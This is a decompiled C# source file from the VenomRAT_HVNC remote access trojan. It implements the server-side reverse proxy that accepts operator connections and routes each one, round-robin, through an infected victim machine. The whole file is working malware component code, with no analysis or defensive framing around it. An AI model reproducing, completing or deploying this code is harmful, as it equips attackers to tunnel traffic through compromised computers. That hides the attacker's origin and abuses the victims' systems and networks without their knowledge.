using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Helper
{
    // Token: 0x02000064 RID: 100
    public class ReverseProxyServer
    {
        // Token: 0x14000009 RID: 9
        // (add) Token: 0x06000348 RID: 840 RVA: 0x0001F724 File Offset: 0x0001F724
        // (remove) Token: 0x06000349 RID: 841 RVA: 0x0001F75C File Offset: 0x0001F75C
        public event ReverseProxyServer.ConnectionEstablishedCallback OnConnectionEstablished;

        // Token: 0x1400000A RID: 10
        // (add) Token: 0x0600034A RID: 842 RVA: 0x0001F794 File Offset: 0x0001F794
        // (remove) Token: 0x0600034B RID: 843 RVA: 0x0001F7CC File Offset: 0x0001F7CC
        public event ReverseProxyServer.UpdateConnectionCallback OnUpdateConnection;

        // Token: 0x1700009E RID: 158
        // (get) Token: 0x0600034C RID: 844 RVA: 0x0001F804 File Offset: 0x0001F804
        public ReverseProxyClient[] ProxyClients
        {
            get
            {
                List<ReverseProxyClient> clients = this._clients;
                ReverseProxyClient[] result;
                lock (clients)
                {
                    result = this._clients.ToArray();
                }
                return result;
            }
        }

        // Token: 0x1700009F RID: 159
        // (get) Token: 0x0600034D RID: 845 RVA: 0x0001F84C File Offset: 0x0001F84C
        public ReverseProxyClient[] OpenConnections
        {
            get
            {
                List<ReverseProxyClient> clients = this._clients;
                ReverseProxyClient[] result;
                lock (clients)
                {
                    List<ReverseProxyClient> list = new List<ReverseProxyClient>();
                    for (int i = 0; i < this._clients.Count; i++)
                    {
                        if (this._clients[i].ProxySuccessful)
                        {
                            list.Add(this._clients[i]);
                        }
                    }
                    result = list.ToArray();
                }
                return result;
            }
        }

        // Token: 0x170000A0 RID: 160
        // (get) Token: 0x0600034E RID: 846 RVA: 0x0001F8D4 File Offset: 0x0001F8D4
        // (set) Token: 0x0600034F RID: 847 RVA: 0x0001F8DC File Offset: 0x0001F8DC
        public Clients[] Clients { get; private set; }

        // Token: 0x06000350 RID: 848 RVA: 0x0001F8E5 File Offset: 0x0001F8E5
        public ReverseProxyServer()
        {
            this._clients = new List<ReverseProxyClient>();
        }

        // Token: 0x06000351 RID: 849 RVA: 0x0001F8F8 File Offset: 0x0001F8F8
        public void StartServer(Clients[] clients, string ipAddress, ushort port)
        {
            this.Stop();
            this.Clients = clients;
            this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            this._socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), (int)port));
            this._socket.Listen(100);
            this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
        }

        // Token: 0x06000352 RID: 850 RVA: 0x0001F960 File Offset: 0x0001F960
        private void AsyncAccept(IAsyncResult ar)
        {
            try
            {
                List<ReverseProxyClient> clients = this._clients;
                lock (clients)
                {
                    this._clients.Add(new ReverseProxyClient(this.Clients[(int)(checked((IntPtr)(unchecked((ulong)this._clientIndex % (ulong)((long)this.Clients.Length)))))], this._socket.EndAccept(ar), this));
                    this._clientIndex += 1U;
                }
            }
            catch
            {
            }
            try
            {
                this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
            }
            catch
            {
            }
        }

        // Token: 0x06000353 RID: 851 RVA: 0x0001FA1C File Offset: 0x0001FA1C
        public void Stop()
        {
            if (this._socket != null)
            {
                this._socket.Close();
                this._socket = null;
            }
            List<ReverseProxyClient> clients = this._clients;
            lock (clients)
            {
                foreach (ReverseProxyClient reverseProxyClient in new List<ReverseProxyClient>(this._clients))
                {
                    reverseProxyClient.Disconnect();
                }
                this._clients.Clear();
            }
        }

        // Token: 0x06000354 RID: 852 RVA: 0x0001FAC4 File Offset: 0x0001FAC4
        public ReverseProxyClient GetClientByConnectionId(int connectionId)
        {
            List<ReverseProxyClient> clients = this._clients;
            ReverseProxyClient result;
            lock (clients)
            {
                result = this._clients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
            }
            return result;
        }

        // Token: 0x06000355 RID: 853 RVA: 0x0001FB24 File Offset: 0x0001FB24
        internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
        {
            try
            {
                if (this.OnConnectionEstablished != null)
                {
                    this.OnConnectionEstablished(proxyClient);
                }
            }
            catch
            {
            }
        }

        // Token: 0x06000356 RID: 854 RVA: 0x0001FB5C File Offset: 0x0001FB5C
        internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
        {
            try
            {
                if (!proxyClient.IsConnected)
                {
                    List<ReverseProxyClient> clients = this._clients;
                    lock (clients)
                    {
                        for (int i = 0; i < this._clients.Count; i++)
                        {
                            if (this._clients[i].ConnectionId == proxyClient.ConnectionId)
                            {
                                this._clients.RemoveAt(i);
                                break;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            try
            {
                if (this.OnUpdateConnection != null)
                {
                    this.OnUpdateConnection(proxyClient);
                }
            }
            catch
            {
            }
        }

        // Token: 0x040002B2 RID: 690
        private Socket _socket;

        // Token: 0x040002B3 RID: 691
        private readonly List<ReverseProxyClient> _clients;

        // Token: 0x040002B5 RID: 693
        private uint _clientIndex;

        // Token: 0x02000065 RID: 101
        // (Invoke) Token: 0x06000358 RID: 856
        public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

        // Token: 0x02000066 RID: 102
        // (Invoke) Token: 0x0600035C RID: 860
        public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);
    }
}